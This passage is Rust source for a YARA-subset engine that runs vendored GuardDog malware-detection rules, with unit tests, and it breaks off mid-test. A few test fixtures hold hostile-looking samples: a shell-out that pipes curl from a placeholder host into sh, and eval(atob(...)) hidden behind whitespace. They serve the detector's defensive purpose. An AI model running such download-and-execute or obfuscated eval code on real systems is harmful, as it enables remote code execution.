//! A YARA subset on `regex` and `aho-corasick`, and GuardDog's threat rules (Task 5).
//!
//! `rules/guarddog/` holds GuardDog's `threat-*.yar` rules, unchanged. The engine here runs the
//! part of YARA those files use: text, regex and hex strings with `nocase`, `wide`, `ascii` and
//! `fullword`; conditions of `and`, `or`, `not`, `of`, string counts, rule names, `filesize` and
//! `ecosystem`. A rule that needs more is left out of the set and listed with its reason.
//!
//! A string's regex runs only when a literal atom of it occurs in the file. Counts (`#id`) are
//! non-overlapping. A rule reports at most one hit per file, so GuardDog's `max_hits` is not used.

mod atoms;
mod eval;
mod parse;

use std::collections::HashMap;
use std::sync::OnceLock;

use aho_corasick::{AhoCorasick, MatchKind};
use regex::bytes::Regex;

use crate::FileCtx;
use eval::PathPat;
use parse::Expr;

/// A set of compiled rules.
#[derive(Debug, Default)]
pub struct RuleSet {
    rules: Vec<CRule>,
    /// The rules that make a hit, in source order.
    reported: Vec<usize>,
    /// Every string of every rule; a rule owns `base..base + len`.
    strings: Vec<CStr>,
    /// The prefilter over the atoms of all strings.
    ac: Option<AhoCorasick>,
    atom_count: usize,
}

#[derive(Debug)]
struct CRule {
    name: String,
    /// `high`, `medium` or `low`; empty for a rule with no severity meta.
    severity: &'static str,
    include: Vec<PathPat>,
    exclude: Vec<PathPat>,
    base: usize,
    len: usize,
    /// The rules this one names.
    refs: Vec<usize>,
    cond: Expr,
}

impl CRule {
    fn applies(&self, path: &str) -> bool {
        (self.include.is_empty() || self.include.iter().any(|p| p.matches(path)))
            && !self.exclude.iter().any(|p| p.matches(path))
    }
}

#[derive(Debug)]
struct CStr {
    re: Regex,
    fullword: bool,
    /// Indices into the automaton; empty means the string always runs.
    atoms: Vec<usize>,
}

/// One rule that matched a file.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct YaraHit {
    pub rule: String,
    /// The rule's own `severity` meta: `high`, `medium` or `low`.
    pub severity: &'static str,
    /// The line of the earliest match; 0 when no string of the rule matched.
    pub line: usize,
    /// The matched text, cut at 200 bytes.
    pub seen: String,
}

/// Compiles `(name, source)` pairs. A rule that uses syntax outside the subset is left out and
/// returned as `(rule, reason)`.
pub fn compile(src: &[(&str, &str)]) -> (RuleSet, Vec<(String, String)>) {
    compile_where(src, &|_| true)
}

impl RuleSet {
    /// The hits of every rule on `f`.
    pub fn eval(&self, f: &FileCtx) -> Vec<YaraHit> {
        self.eval_with(f, true)
    }

    /// The names of the rules that make hits, in source order.
    pub fn names(&self) -> Vec<&str> {
        self.reported
            .iter()
            .map(|&r| self.rules[r].name.as_str())
            .collect()
    }

    /// `eval` with every string run, for the prefilter test.
    #[cfg(test)]
    fn eval_brute_force(&self, f: &FileCtx) -> Vec<YaraHit> {
        self.eval_with(f, false)
    }
}

/// The compile state of one parsed rule.
#[derive(Clone)]
enum State {
    Todo,
    Building,
    Done(Result<usize, String>),
}

/// How deep rule references may chain.
const MAX_RULE_DEPTH: usize = 64;

struct Builder<'a> {
    parsed: &'a [parse::Rule],
    by_name: HashMap<&'a str, usize>,
    state: Vec<State>,
    rules: Vec<CRule>,
    strings: Vec<CStr>,
    atom_ids: HashMap<Vec<u8>, usize>,
    atoms: Vec<Vec<u8>>,
}

impl Builder<'_> {
    /// Builds parsed rule `p` and the rules it names; returns its index in `rules`.
    fn build(&mut self, p: usize, depth: usize) -> Result<usize, String> {
        match &self.state[p] {
            State::Done(r) => return r.clone(),
            State::Building => return Err("the rule refers to itself".to_string()),
            State::Todo => {}
        }
        if depth > MAX_RULE_DEPTH {
            return Err("rules refer to each other too deeply".to_string());
        }
        self.state[p] = State::Building;
        let result = self.build_rule(p, depth);
        self.state[p] = State::Done(result.clone());
        result
    }

    fn build_rule(&mut self, p: usize, depth: usize) -> Result<usize, String> {
        let parsed = self.parsed;
        let rule = &parsed[p];
        let severity = match rule.meta_str("severity") {
            None => "",
            Some("high") => "high",
            Some("medium") => "medium",
            Some("low") => "low",
            Some(other) => return Err(format!("unsupported severity `{other}`")),
        };
        let paths = |key: &str| {
            rule.meta_str(key)
                .map_or(Ok(Vec::new()), PathPat::parse_list)
        };
        let (include, exclude) = (paths("path_include")?, paths("path_exclude")?);
        let mut built = Vec::with_capacity(rule.strings.len());
        for s in &rule.strings {
            built.push(atoms::build(s).map_err(|e| format!("${}: {e}", s.id))?);
        }
        let mut refs = Vec::new();
        let cond = self.resolve(&rule.cond, depth, &mut refs)?;
        let base = self.strings.len();
        let len = built.len();
        for (s, b) in rule.strings.iter().zip(built) {
            let atoms = b.atoms.into_iter().map(|a| self.atom_id(a)).collect();
            self.strings.push(CStr {
                re: b.re,
                fullword: s.fullword,
                atoms,
            });
        }
        self.rules.push(CRule {
            name: rule.name.clone(),
            severity,
            include,
            exclude,
            base,
            len,
            refs,
            cond,
        });
        Ok(self.rules.len() - 1)
    }

    fn atom_id(&mut self, atom: Vec<u8>) -> usize {
        if let Some(&id) = self.atom_ids.get(&atom) {
            return id;
        }
        let id = self.atoms.len();
        self.atom_ids.insert(atom.clone(), id);
        self.atoms.push(atom);
        id
    }

    /// `e` with each rule name replaced by the index of the built rule.
    fn resolve(&mut self, e: &Expr, depth: usize, refs: &mut Vec<usize>) -> Result<Expr, String> {
        Ok(match e {
            Expr::Rule(name) => {
                let Some(&dep) = self.by_name.get(name.as_str()) else {
                    return Err(format!("undefined rule {name}"));
                };
                let idx = self
                    .build(dep, depth + 1)
                    .map_err(|why| format!("uses rule {name}, which does not compile: {why}"))?;
                if !refs.contains(&idx) {
                    refs.push(idx);
                }
                Expr::RuleRef(idx)
            }
            Expr::Not(x) => Expr::Not(Box::new(self.resolve(x, depth, refs)?)),
            Expr::And(v) => Expr::And(
                v.iter()
                    .map(|x| self.resolve(x, depth, refs))
                    .collect::<Result<_, _>>()?,
            ),
            Expr::Or(v) => Expr::Or(
                v.iter()
                    .map(|x| self.resolve(x, depth, refs))
                    .collect::<Result<_, _>>()?,
            ),
            Expr::Cmp(op, a, b) => Expr::Cmp(
                *op,
                Box::new(self.resolve(a, depth, refs)?),
                Box::new(self.resolve(b, depth, refs)?),
            ),
            Expr::Sum(terms) => Expr::Sum(
                terms
                    .iter()
                    .map(|(neg, x)| Ok((*neg, self.resolve(x, depth, refs)?)))
                    .collect::<Result<_, String>>()?,
            ),
            other => other.clone(),
        })
    }
}

/// Compiles `src`, building the rules `keep` accepts and the rules they name. Only the accepted
/// rules make hits.
fn compile_where(
    src: &[(&str, &str)],
    keep: &dyn Fn(&parse::Rule) -> bool,
) -> (RuleSet, Vec<(String, String)>) {
    let mut errors = Vec::new();
    let mut parsed: Vec<parse::Rule> = Vec::new();
    for (file, text) in src {
        let p = parse::parse(file, text);
        errors.extend(p.errors);
        for rule in p.rules {
            if parsed.iter().any(|r| r.name == rule.name) {
                errors.push((
                    rule.name,
                    "a rule of this name is already defined".to_string(),
                ));
            } else {
                parsed.push(rule);
            }
        }
    }
    let mut b = Builder {
        parsed: &parsed,
        by_name: parsed
            .iter()
            .enumerate()
            .map(|(n, r)| (r.name.as_str(), n))
            .collect(),
        state: vec![State::Todo; parsed.len()],
        rules: Vec::new(),
        strings: Vec::new(),
        atom_ids: HashMap::new(),
        atoms: Vec::new(),
    };
    let mut reported = Vec::new();
    for (n, rule) in parsed.iter().enumerate() {
        if !keep(rule) {
            continue;
        }
        match b.build(n, 0) {
            Ok(idx) if !rule.private && !b.rules[idx].severity.is_empty() => reported.push(idx),
            Ok(_) => {}
            Err(why) => errors.push((rule.name.clone(), why)),
        }
    }
    let ac = AhoCorasick::builder()
        .ascii_case_insensitive(true)
        .match_kind(MatchKind::Standard)
        .build(&b.atoms)
        .ok()
        .filter(|_| !b.atoms.is_empty());
    let set = RuleSet {
        rules: b.rules,
        reported,
        strings: b.strings,
        ac,
        atom_count: b.atoms.len(),
    };
    (set, errors)
}

/// Whether the GuardDog rule `r` is in the enabled set: `severity` and `specificity` both `high`,
/// not a `threat-npm-*` rule (the auto-run rules own those) and not in `DISABLED`.
fn enabled(r: &parse::Rule) -> bool {
    r.meta_str("severity") == Some("high")
        && r.meta_str("specificity") == Some("high")
        && !r.name.starts_with("threat_npm_")
        && !DISABLED.iter().any(|(name, _)| *name == r.name)
}

macro_rules! vendored {
    ($($name:literal),* $(,)?) => {
        &[$(($name, include_str!(concat!("../../rules/guarddog/", $name)))),*]
    };
}

/// Every vendored GuardDog file, `(file name, text)`. A test checks the list equals the folder.
const FILES: &[(&str, &str)] = vendored![
    "hooks.meta",
    "lolbas-net.meta",
    "lolbas-proc.meta",
    "lolbas-sysinfo.meta",
    "threat-filesystem-autostart.yar",
    "threat-filesystem-destruction.yar",
    "threat-filesystem-read.yar",
    "threat-network-dns-exfil.yar",
    "threat-network-exfil-messenger.yar",
    "threat-network-exfil-sysinfo.yar",
    "threat-network-exfiltration.yar",
    "threat-network-outbound-shady-links.yar",
    "threat-network-reverse-shell.yar",
    "threat-npm-dependency-confusion.yar",
    "threat-npm-http-dependency.yar",
    "threat-npm-preinstall-script.yar",
    "threat-process-cryptomining.yar",
    "threat-process-download-exec.yar",
    "threat-process-hooks.yar",
    "threat-process-injection-dll.yar",
    "threat-process-memory.yar",
    "threat-process-powershell-encoded.yar",
    "threat-process-spawn-silent.yar",
    "threat-process-sysinfo.yar",
    "threat-runtime-autostart.yar",
    "threat-runtime-dynamic-loader.yar",
    "threat-runtime-enumeration.yar",
    "threat-runtime-environment-read.yar",
    "threat-runtime-keylogging.yar",
    "threat-runtime-obfuscation-api.yar",
    "threat-runtime-obfuscation-base64exec.yar",
    "threat-runtime-obfuscation-chr.yar",
    "threat-runtime-obfuscation-dynamic-eval.yar",
    "threat-runtime-obfuscation-general.yar",
    "threat-runtime-obfuscation-hidden-code.yar",
    "threat-runtime-obfuscation-import-exec.yar",
    "threat-runtime-obfuscation-js-mangling.yar",
    "threat-runtime-obfuscation-log-suppress.yar",
    "threat-runtime-obfuscation-pyarmor.yar",
    "threat-runtime-obfuscation-steganography.yar",
    "threat-runtime-obfuscation-unicode.yar",
    "threat-runtime-obfuscation.yar",
    "threat-runtime-screencapture.yar",
    "threat-runtime-self-propagation.yar",
    "threat-runtime-system-info.yar",
    "threat-setup-import-aliasing.yar",
    "threat-setup-network-in-install.yar",
    "threat-setup-suspicious-imports.yar",
];

/// The enabled GuardDog threat rules, compiled once.
pub fn guarddog() -> &'static RuleSet {
    static RULES: OnceLock<RuleSet> = OnceLock::new();
    RULES.get_or_init(|| compile_where(FILES, &enabled).0)
}

/// GuardDog rules that use syntax outside the subset: `(rule, reason)`. The engine runs every one
/// of the 44 threat rules and the 4 helper files, so the list is empty. A test compiles them all and
/// fails when this list differs from what does not compile.
pub const UNSUPPORTED: &[(&str, &str)] = &[];

/// GuardDog rules left off because of a false alarm in the corpus: `(rule, reason)`.
///
/// Empty so far. The 18 enabled rules ran over 51,000 code files of 16 well-known open-source repos
/// (django, react, webpack, ansible, pip, pytest, flask, requests, axios and others): 17 files
/// matched, none of them a file an install script runs, so a hit stays MEDIUM. The matches were:
/// `threat_process_download_exec` 9 (an `eval(` next to `fetch(`, a `downloadFile(` helper, a test
/// that runs `pip install`), `threat_filesystem_autostart` 4 (`/etc/init.d/` in service modules, pip's
/// `easy-install.pth`), and one each for `threat_runtime_dynamic_loader` (django's hasher loader),
/// `threat_filesystem_destruction` and `threat_process_cryptomining` (both a string in axios tests).
/// An entry goes here when the full network corpus (Task 15) shows a HIGH or CRITICAL it causes.
pub const DISABLED: &[(&str, &str)] = &[];

#[cfg(test)]
mod tests {
    use std::collections::BTreeSet;
    use std::sync::OnceLock;
    use std::time::Instant;

    use proptest::prelude::*;

    use super::*;
    use crate::{FileKind, Lang};

    // Indicator text is built from parts so this file stays clean when the repo scans itself.
    fn j(parts: &[&str]) -> String {
        parts.concat()
    }

    fn ctx<'a>(path: &'a str, text: &'a str) -> FileCtx<'a> {
        FileCtx {
            path,
            bytes: text.as_bytes(),
            text: Some(text),
            kind: FileKind::Code(Lang::Py),
            truncated: false,
        }
    }

    fn ctx_bytes<'a>(path: &'a str, bytes: &'a [u8]) -> FileCtx<'a> {
        FileCtx {
            path,
            bytes,
            text: None,
            kind: FileKind::Code(Lang::Py),
            truncated: false,
        }
    }

    /// Compiles one rule source that must compile.
    fn rules(src: &str) -> RuleSet {
        let (set, errs) = compile(&[("t.yar", src)]);
        assert!(errs.is_empty(), "{errs:?}");
        set
    }

    /// The names of the hits of `src` on `text` at `path`.
    fn names(src: &str, path: &str, text: &str) -> Vec<String> {
        rules(src)
            .eval(&ctx(path, text))
            .into_iter()
            .map(|h| h.rule)
            .collect()
    }

    fn hits(src: &str, text: &str) -> bool {
        !names(src, "a.py", text).is_empty()
    }

    fn rule(strings: &str, condition: &str) -> String {
        format!("rule r {{ meta: severity = \"high\" strings: {strings} condition: {condition} }}")
    }

    fn full() -> &'static RuleSet {
        static FULL: OnceLock<RuleSet> = OnceLock::new();
        FULL.get_or_init(|| compile(FILES).0)
    }

    #[test]
    fn a_text_string_hits_and_reports_its_line() {
        let set = rules(&rule("$a = \"foo\"", "$a"));
        let got = set.eval(&ctx("a.py", "x\ny\nfoo bar\n"));
        assert_eq!(
            got,
            [YaraHit {
                rule: "r".into(),
                severity: "high",
                line: 3,
                seen: "foo".into()
            }]
        );
        assert!(set.eval(&ctx("a.py", "nothing here")).is_empty());
    }

    #[test]
    fn crlf_counts_as_one_line() {
        let set = rules(&rule("$a = \"foo\"", "$a"));
        assert_eq!(set.eval(&ctx("a.py", "a\r\nb\r\nfoo"))[0].line, 3);
    }

    #[test]
    fn nocase_matches_any_case_and_its_absence_is_exact() {
        let nocase = rule("$a = \"FoO\" nocase", "$a");
        assert!(hits(&nocase, "xx fOo xx"));
        let exact = rule("$a = \"FoO\"", "$a");
        assert!(!hits(&exact, "xx fOo xx"));
        assert!(hits(&exact, "xx FoO xx"));
    }

    #[test]
    fn text_strings_are_literal_and_honor_escapes() {
        assert!(hits(&rule("$a = \"a.b(c)\"", "$a"), "a.b(c)"));
        assert!(!hits(&rule("$a = \"a.b(c)\"", "$a"), "aXb(c)"));
        assert!(hits(&rule("$a = \"tab\\there\"", "$a"), "tab\there"));
        assert!(hits(&rule("$a = \"q\\\"uote\"", "$a"), "q\"uote"));
        assert!(hits(&rule("$a = \"\\x41\\x42\"", "$a"), "AB"));
    }

    #[test]
    fn wide_matches_utf16le_and_ascii_matches_text() {
        let wide = rules(&rule("$a = \"foo\" wide", "$a"));
        assert_eq!(wide.eval(&ctx_bytes("a.py", b"f\0o\0o\0")).len(), 1);
        assert!(wide.eval(&ctx_bytes("a.py", b"foo")).is_empty());
        let both = rules(&rule("$a = \"foo\" wide ascii", "$a"));
        assert_eq!(both.eval(&ctx_bytes("a.py", b"f\0o\0o\0")).len(), 1);
        assert_eq!(both.eval(&ctx_bytes("a.py", b"foo")).len(), 1);
    }

    #[test]
    fn fullword_needs_a_boundary_on_both_sides() {
        let src = rule("$a = \"foo\" fullword", "$a");
        assert!(hits(&src, "foo"));
        assert!(hits(&src, "a foo b"));
        assert!(hits(&src, "(foo)"));
        assert!(!hits(&src, "foobar"));
        assert!(!hits(&src, "barfoo"));
        assert!(!hits(&src, "_foo_"));
        assert!(!hits(&src, "foo1"));
        assert!(hits(&src, "foobar foo"));
    }

    #[test]
    fn a_regex_string_takes_its_flags() {
        assert!(hits(&rule("$a = /fo+\\s*bar/", "$a"), "fooo   bar"));
        assert!(!hits(&rule("$a = /fo+bar/", "$a"), "FOOBAR"));
        assert!(hits(&rule("$a = /fo+bar/i", "$a"), "FOOBAR"));
        assert!(hits(&rule("$a = /fo+bar/ nocase", "$a"), "FOOBAR"));
        assert!(!hits(&rule("$a = /a.b/", "$a"), "a\nb"));
        assert!(hits(&rule("$a = /a.b/s", "$a"), "a\nb"));
        assert!(hits(&rule("$a = /a\\/b/", "$a"), "a/b"));
    }

    #[test]
    fn hex_strings_take_wildcards_gaps_and_alternatives() {
        let src = rule("$a = { 41 ?? 43 [1-2] 44 ( 45 | 46 47 ) }", "$a");
        assert!(hits(&src, "AxC12DE"));
        assert!(hits(&src, "AxC1DFG"));
        assert!(!hits(&src, "AxC123DE"));
        assert!(!hits(&src, "AxC12DX"));
        let utf16 = rule("$a = { 5F 00 30 00 78 00 [2-12] 3D 00 }", "$a");
        let bytes = b"_\0" as &[u8];
        let mut blob = bytes.to_vec();
        blob.extend_from_slice(b"0\0x\0a\0b\0=\0");
        let set = rules(&utf16);
        assert_eq!(set.eval(&ctx_bytes("a.py", &blob)).len(), 1);
    }

    #[test]
    fn counts_and_arithmetic() {
        let two = rule("$a = \"ab\"", "#a >= 2");
        assert!(!hits(&two, "ab"));
        assert!(hits(&two, "ab ab"));
        let sum = rule("$a = \"ab\" $b = \"cd\"", "#a + #b > 3");
        assert!(!hits(&sum, "ab cd ab"));
        assert!(hits(&sum, "ab cd ab cd"));
        let diff = rule("$a = \"ab\" $b = \"cd\"", "#a - #b == 1");
        assert!(hits(&diff, "ab ab cd"));
        let ne = rule("$a = \"ab\"", "#a != 0 and #a < 3 and #a <= 2 and #a > 0");
        assert!(hits(&ne, "ab"));
        assert!(!hits(&ne, "ab ab ab"));
    }

    #[test]
    fn of_expressions_take_sets_wildcards_and_them() {
        let strings = "$x_1 = \"a1\" $x_2 = \"a2\" $y = \"b\"";
        assert!(hits(&rule(strings, "any of ($x*)"), "a2"));
        assert!(!hits(&rule(strings, "any of ($x*)"), "b"));
        assert!(hits(&rule(strings, "all of ($x*)"), "a1 a2"));
        assert!(!hits(&rule(strings, "all of ($x*)"), "a1"));
        assert!(hits(&rule(strings, "2 of them"), "a1 b"));
        assert!(!hits(&rule(strings, "2 of them"), "a1"));
        assert!(hits(&rule(strings, "1 of ($x_1, $y)"), "b"));
        assert!(hits(&rule(strings, "none of ($x*)"), "b"));
        assert!(!hits(&rule(strings, "none of ($x*)"), "a1"));
        assert!(hits(&rule(strings, "all of them"), "a1 a2 b"));
        assert!(hits(&rule(strings, "any of them"), "a1"));
    }

    #[test]
    fn boolean_operators_nest_with_the_usual_precedence() {
        let s = "$a = \"a\" $b = \"b\" $c = \"c\"";
        assert!(hits(&rule(s, "$a or $b and $c"), "a"));
        assert!(!hits(&rule(s, "($a or $b) and $c"), "a"));
        assert!(hits(&rule(s, "($a or $b) and $c"), "b c"));
        assert!(hits(&rule(s, "not $a"), "b"));
        assert!(!hits(&rule(s, "not $a"), "a"));
        assert!(hits(&rule(s, "$a and not $b"), "a c"));
        assert!(!hits(&rule(s, "true and false"), "a"));
        assert!(hits(&rule(s, "true and not false"), "x"));
    }

    #[test]
    fn rules_refer_to_private_rules_and_each_other() {
        let src = "private rule inner { strings: $i = \"in\" condition: $i }\n\
                   rule other { meta: severity = \"low\" strings: $o = \"ot\" condition: $o }\n\
                   rule outer { meta: severity = \"medium\" strings: $x = \"xx\" condition: inner and $x }\n\
                   rule both { meta: severity = \"high\" condition: other and outer }";
        assert_eq!(names(src, "a.py", "in xx"), ["outer"]);
        assert_eq!(names(src, "a.py", "in xx ot"), ["other", "outer", "both"]);
        assert!(names(src, "a.py", "xx").is_empty());
    }

    #[test]
    fn a_rule_without_a_severity_is_not_reported() {
        let src = "rule quiet { strings: $a = \"a\" condition: $a }";
        assert!(names(src, "a.py", "a").is_empty());
        let medium = "rule loud { meta: severity = \"medium\" strings: $a = \"a\" condition: $a }";
        let got = rules(medium).eval(&ctx("a.py", "a"));
        assert_eq!(got[0].severity, "medium");
    }

    #[test]
    fn filesize_compares_the_bytes() {
        let src = rule("", "filesize < 10 and filesize >= 3");
        assert!(hits(&src, "abc"));
        assert!(!hits(&src, "ab"));
        assert!(!hits(&src, "abcdefghij"));
        let kb = rule("", "filesize > 1KB");
        assert!(!hits(&kb, "abc"));
        assert!(hits(&kb, &"a".repeat(2000)));
    }

    #[test]
    fn ecosystem_comes_from_the_extension() {
        let src = |e: &str| rule("", &format!("ecosystem == \"{e}\""));
        for (path, eco) in [
            ("a.py", "pypi"),
            ("a.pth", "pypi"),
            ("a.pyi", "pypi"),
            ("a.js", "npm"),
            ("a.mjs", "npm"),
            ("a.tsx", "npm"),
            ("a.go", "go"),
            ("a.rb", "rubygems"),
            ("a.gemspec", "rubygems"),
            ("a.rs", "crates"),
        ] {
            assert_eq!(names(&src(eco), path, "x").len(), 1, "{path} is {eco}");
        }
        assert!(names(&src("pypi"), "a.js", "x").is_empty());
        assert!(names(&src("pypi"), "a.txt", "x").is_empty());
        let ne = rule("", "ecosystem != \"pypi\"");
        assert_eq!(names(&ne, "a.js", "x").len(), 1);
        assert!(names(&ne, "a.py", "x").is_empty());
    }

    #[test]
    fn path_include_and_exclude_gate_the_rule() {
        let src = "rule r { meta: severity = \"high\" path_include = \"*.js,*/setup.py,Pkg.toml\" \
                   path_exclude = \"dist/*,build/*\" strings: $a = \"a\" condition: $a }";
        assert_eq!(names(src, "src/a.js", "a").len(), 1);
        assert!(names(src, "src/a.py", "a").is_empty());
        assert_eq!(names(src, "x/y/setup.py", "a").len(), 1);
        assert_eq!(names(src, "setup.py", "a").len(), 1);
        assert_eq!(names(src, "Pkg.toml", "a").len(), 1);
        assert!(names(src, "x/Pkg.toml", "a").is_empty());
        assert!(names(src, "dist/a.js", "a").is_empty());
        assert!(names(src, "pkg/build/a.js", "a").is_empty());
        assert_eq!(names(src, "distant/a.js", "a").len(), 1);
    }

    #[test]
    fn one_hit_per_rule_reports_the_earliest_match_its_condition_looked_at() {
        let src = rule("$a = \"late\" $b = \"early\"", "$a and $b");
        let set = rules(&src);
        let got = set.eval(&ctx("a.py", "x\nearly\nlate"));
        assert_eq!(got.len(), 1);
        assert_eq!((got[0].line, got[0].seen.as_str()), (2, "early"));
    }

    #[test]
    fn a_long_match_is_cut_in_seen() {
        let src = rule("$a = /a.*z/", "$a");
        let text = format!("a{}z", "m".repeat(5000));
        let got = rules(&src).eval(&ctx("a.py", &text));
        assert!(got[0].seen.len() <= 200, "{}", got[0].seen.len());
    }

    #[test]
    fn include_lines_resolve_against_the_other_sources() {
        let meta = "private rule helper { strings: $h = \"hh\" condition: $h }";
        let main = "include \"helper.meta\"\n\
                    rule uses { meta: severity = \"high\" condition: helper }";
        let (set, errs) = compile(&[("helper.meta", meta), ("main.yar", main)]);
        assert!(errs.is_empty(), "{errs:?}");
        assert_eq!(set.eval(&ctx("a.py", "hh")).len(), 1);
        // A reference with no rule behind it is a compile error, not a panic.
        let (_, errs) = compile(&[("main.yar", main)]);
        assert_eq!(errs.len(), 1);
        assert_eq!(errs[0].0, "uses");
    }

    #[test]
    fn comments_and_meta_types_parse() {
        let src = "// head\n/* block\n comment */ rule r { // trailing\n meta:\n severity = \"high\"\n \
                   n = 3\n flag = true\n strings:\n $a = \"a\" // one\n /* two */ $b = \"b\"\n \
                   condition:\n $a /* mid */ or $b }";
        assert!(hits(src, "b"));
    }

    #[test]
    fn unsupported_syntax_is_a_per_rule_error() {
        let src = "rule bad { meta: severity = \"high\" strings: $a = \"a\" condition: for any i in (1..3) : ( $a at i ) }\n\
                   rule good { meta: severity = \"high\" strings: $a = \"a\" condition: $a }";
        let (set, errs) = compile(&[("t.yar", src)]);
        assert_eq!(errs.len(), 1, "{errs:?}");
        assert_eq!(errs[0].0, "bad");
        assert!(errs[0].1.contains("for"), "{}", errs[0].1);
        let got = set.eval(&ctx("a.py", "a"));
        assert_eq!(
            got.iter().map(|h| h.rule.as_str()).collect::<Vec<_>>(),
            ["good"]
        );
    }

    #[test]
    fn each_unsupported_construct_names_itself() {
        let cases = [
            ("$a = \"a\" xor", "$a", "xor"),
            ("$a = \"a\" base64", "$a", "base64"),
            ("$a = /a/ wide", "$a", "wide"),
            ("$a = \"a\"", "$a at 0", "at"),
            ("$a = \"a\"", "$a in (0..9)", "in"),
            ("$a = \"a\"", "@a[1] == 3", "@"),
            ("$a = \"a\"", "uint16(0) == 0x5a4d", "uint16"),
            ("$a = \"a\"", "$a matches /x/", "matches"),
            ("$a = \"a\"", "$undefined", "undefined"),
            ("$a = \"a\"", "nosuchrule", "nosuchrule"),
            ("$a = { 4? 41 }", "$a", "nibble"),
            ("$a = { 41 [-] 42 }", "$a", "gap"),
            ("$a = /(/", "$a", "regex"),
            ("$a = { 41 [1-999999] 42 }", "$a", "regex"),
            ("$a = \"a\" private", "$a", "private"),
            ("", "any of ($nope*)", "nope"),
        ];
        for (strings, condition, word) in cases {
            let src = rule(strings, condition);
            let (set, errs) = compile(&[("t.yar", &src)]);
            assert_eq!(errs.len(), 1, "{condition}: {errs:?}");
            assert_eq!(errs[0].0, "r");
            assert!(errs[0].1.contains(word), "{condition}: {}", errs[0].1);
            assert!(set.eval(&ctx("a.py", "a")).is_empty());
        }
    }

    #[test]
    fn a_cyclic_rule_reference_is_an_error() {
        let src = "rule a { meta: severity = \"high\" condition: b }\n\
                   rule b { meta: severity = \"high\" condition: a }";
        let (_, errs) = compile(&[("t.yar", src)]);
        assert!(!errs.is_empty());
    }

    #[test]
    fn broken_input_never_panics() {
        let deep = format!(
            "rule a {{ meta: severity = \"high\" condition: {}true{} }}",
            "(".repeat(20_000),
            ")".repeat(20_000)
        );
        let nots = format!(
            "rule a {{ meta: severity = \"high\" condition: {}true }}",
            "not ".repeat(20_000)
        );
        let inputs = [
            "",
            "rule",
            "rule a",
            "rule a {",
            "rule a { meta:",
            "rule a { strings: $a = \"unterminated",
            "rule a { strings: $a = /unterminated",
            "rule a { strings: $a = { 41 ",
            "rule a { condition: ",
            "rule a { condition: $",
            "/* never closed",
            "}}}}",
            "rule { }",
            "rule a { strings: $a = \"x\" condition: 99999999999999999999999 }",
            deep.as_str(),
            nots.as_str(),
        ];
        for src in inputs {
            let (set, _errs) = compile(&[("t.yar", src)]);
            let _ = set.eval(&ctx("a.py", "text"));
        }
    }

    #[test]
    fn the_vendored_list_matches_the_folder() {
        let dir = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("rules/guarddog");
        let mut on_disk: Vec<String> = std::fs::read_dir(&dir)
            .unwrap()
            .map(|e| e.unwrap().file_name().into_string().unwrap())
            .filter(|n| n.ends_with(".yar") || n.ends_with(".meta"))
            .collect();
        on_disk.sort();
        let mut listed: Vec<String> = FILES.iter().map(|(n, _)| n.to_string()).collect();
        listed.sort();
        assert_eq!(listed, on_disk);
        assert_eq!(
            listed.iter().filter(|n| n.starts_with("threat-")).count(),
            44
        );
        assert_eq!(listed.iter().filter(|n| n.ends_with(".meta")).count(), 4);
        for (name, text) in FILES {
            let disk = std::fs::read_to_string(dir.join(name)).unwrap();
            assert_eq!(&disk, text, "{name}");
        }
        for name in ["LICENSE", "NOTICE", "SOURCE"] {
            assert!(dir.join(name).is_file(), "{name}");
        }
    }

    #[test]
    fn every_rule_compiles_or_is_unsupported_with_a_reason() {
        let (_, errs) = compile(FILES);
        let mut got: Vec<(&str, &str)> =
            errs.iter().map(|(a, b)| (a.as_str(), b.as_str())).collect();
        got.sort();
        let mut want: Vec<(&str, &str)> = UNSUPPORTED.to_vec();
        want.sort();
        assert_eq!(got, want);
        for (rule, reason) in UNSUPPORTED {
            assert!(!reason.is_empty(), "{rule}");
        }
        // Every threat rule is in the set, but for the ones pinned as unsupported.
        assert_eq!(full().names().len() + UNSUPPORTED.len(), 44);
    }

    #[test]
    fn disabled_rules_are_real_enabled_candidates_with_a_reason() {
        let all = full().names();
        for (rule, reason) in DISABLED {
            assert!(all.contains(rule), "{rule} is not a vendored rule");
            assert!(!reason.is_empty(), "{rule}");
            assert!(
                !guarddog().names().contains(rule),
                "{rule} is still enabled"
            );
        }
    }

    #[test]
    fn the_enabled_set_is_pinned() {
        let want: BTreeSet<&str> = [
            "threat_filesystem_autostart",
            "threat_filesystem_destruction",
            "threat_network_dns_exfil",
            "threat_network_exfil_messenger",
            "threat_network_exfil_sysinfo",
            "threat_network_reverse_shell",
            "threat_process_cryptomining",
            "threat_process_download_exec",
            "threat_process_powershell_encoded",
            "threat_runtime_dynamic_loader",
            "threat_runtime_obfuscation_chr",
            "threat_runtime_obfuscation_dynamic_eval",
            "threat_runtime_obfuscation_hidden_code",
            "threat_runtime_obfuscation_import_exec",
            "threat_runtime_self_propagation",
            "threat_setup_import_aliasing",
            "threat_setup_network_in_install",
            "threat_setup_suspicious_imports",
        ]
        .into_iter()
        .collect();
        let got: BTreeSet<&str> = guarddog().names().into_iter().collect();
        assert_eq!(got, want);
    }

    fn first_hit(set: &RuleSet, path: &str, text: &str, rule: &str) -> Option<YaraHit> {
        set.eval(&ctx(path, text))
            .into_iter()
            .find(|h| h.rule == rule)
    }

    #[test]
    fn download_exec_hits_a_shell_out_to_curl() {
        let text = j(&[
            "import os\nos.sys",
            "tem('cu",
            "rl https://example.invalid/x | sh')\n",
        ]);
        let hit = first_hit(
            guarddog(),
            "pkg/helper.py",
            &text,
            "threat_process_download_exec",
        )
        .unwrap();
        assert_eq!((hit.severity, hit.line), ("high", 2));
        assert!(hit.seen.starts_with("os.sys"), "{}", hit.seen);
        assert!(
            first_hit(
                guarddog(),
                "pkg/helper.py",
                "import os\nprint(os.getcwd())\n",
                "threat_process_download_exec"
            )
            .is_none()
        );
        // The rule's path_include keeps it off a README.
        assert!(
            first_hit(
                guarddog(),
                "README.md",
                &text,
                "threat_process_download_exec"
            )
            .is_none()
        );
    }

    #[test]
    fn hidden_code_hits_a_require_aliased_through_a_global() {
        let text = j(&["const a = 1;\nglobal['r'] = req", "uire;\n"]);
        let hit = first_hit(
            guarddog(),
            "lib/a.js",
            &text,
            "threat_runtime_obfuscation_hidden_code",
        )
        .unwrap();
        assert_eq!(hit.line, 2);
        let pushed = j(&["x();", &" ".repeat(450), "ev", "al(atob(p));"]);
        assert!(
            first_hit(
                guarddog(),
                "lib/a.js",
                &pushed,
                "threat_runtime_obfuscation_hidden_code"
            )
